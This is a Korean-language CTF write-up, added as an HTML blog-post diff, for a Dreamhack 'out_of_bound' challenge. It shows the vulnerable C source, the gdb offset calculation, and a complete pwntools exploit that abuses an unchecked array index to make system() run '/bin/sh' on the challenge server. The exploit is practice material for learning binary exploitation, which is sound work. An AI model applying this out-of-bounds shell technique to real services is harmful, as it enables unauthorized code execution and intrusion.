@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf4 · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag {
+      background: var(--tag); border-radius: 4px;
+      padding: .1rem .5rem; font-size: .72rem; color: var(--muted);
+    }
+    .post-body { line-height: 1.8; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.3rem; font-weight: 400; margin: 2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.5rem 0 .5rem; }
+    .post-body p  { margin-bottom: 1rem; color: var(--ink); }
+    .post-body ul { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .3rem; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem;
+      margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code {
+      background: var(--tag); border-radius: 3px;
+      padding: .1rem .35rem; font-size: .85em;
+    }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+
+<main class="page">
+  <a class="back-link" href="../posts.html">
+    ← Back to Posts
+  </a>
+
+  <div class="post-header">
+    <h1>ctf4</h1>
+    <div class="post-meta">
+      <span>2026·03</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+
+  <hr class="post-divider">
+
+  <div class="post-body">
+<h2>문제</h2>
+
+<h3>**Description**</h3>
+
+<p>이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가 주어집니다.</p>
+
+<p>프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.</p>
+
+<p>"flag" 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.</p>
+
+<p>플래그의 형식은 DH{...} 입니다.</p>
+
+<pre><code class="language-python">
+gef➤  shell cat out_of_bound.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+char name[16];
+
+char *command[10] = { "cat",
+    "ls",
+    "id",
+    "ps",
+    "file ./oob" };
+void alarm_handler()
+{
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize()
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+int main()
+{
+    int idx;
+
+    initialize();
+
+    printf("Admin name: ");
+    read(0, name, sizeof(name));
+    printf("What do you want?: ");
+
+    scanf("%d", &amp;idx);
+
+    system(command[idx]);
+
+    return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<p>[OOB 개념] 은 notion 에 정리</p>
+
+<pre><code class="language-python">
+gef➤  i var name
+All variables matching regular expression "name":
+
+Non-debugging symbols:
+0x0804a0ac  name
+gef➤  i var command
+All variables matching regular expression "command":
+
+Non-debugging symbols:
+0x0804a060  command
+gef➤  print 0x0804a0ac - 0x0804a060
+$2 = 0x4c
+</code></pre>
+
+<p>0x4c = 64 + 12 = 76</p>
+
+<p>76 / 4 (byte) = 19</p>
+
+<p>> 만약 프로그램이 <code>scanf</code>가 아니라 <code>read(0, &idx, 4);</code> 처럼 변수에 원시 바이트를 직접 꽂아 넣는 함수를 썼다면, 그때는 <code>p32(19)</code>를 사용하는 게 맞다</p>
+<p>> </p>
+
+<pre><code class="language-python">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0312]
+└─$ !c
+cat ex.py
+from pwn import *
+
+p = remote("host3.dreamhack.games", 20179)
+
+# 0x0804a0ac + 4 = 0x0804a0b0
+payload = p32(0x0804a0b0) + b"/bin/sh\x00"
+
+p.sendafter(b"Admin name: ", payload)
+
+p.sendlineafter(b"What do you want?: ", b"19")
+
+p.interactive()
+</code></pre>
+  </div>
+</main>
+
+<script src="../../js/nav.js"></script>
+</body>
+</html>
